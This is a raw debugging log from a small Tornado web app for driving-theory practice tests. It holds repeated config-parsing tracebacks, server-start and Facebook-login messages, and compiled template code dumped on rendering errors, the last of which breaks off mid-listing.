  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
dev
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
dev
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
prod
Server started successfully.
prod
Server started successfully.
prod
Server started successfully.
prod
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Server started successfully.
Server started successfully.
prod
prod
Server started successfully.
prod
Server started successfully.
prod
Server started successfully.
prod
Server started successfully.
prod
Server started successfully.
prod
Server started successfully.
prod
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8000:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright"><a href="/landing/about">About Us</a> | <a href="/landing/terms">Terms & Conditions</a> | <a href="/landing/privacy">Privacy Policy</a> | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8002:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
/home/george/
Server started successfully.
/home/george/
Server started successfully.
/home/george/
Server started successfully.
/home/george/
Server started successfully.
Server started successfully.
/home/george/
/home/george/
Server started successfully.
/home/george/
Server started successfully.
/home/george/
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8002:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8002:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
WARNING:root:404 GET /cgi-bin/ (127.0.0.1) 1.17ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
INFO:intheory-8002:Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
INFO:intheory-8001:Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 506319068e4c852a5e0b3818 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506319068e4c852a5e0b3818 has successfully logged in.
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
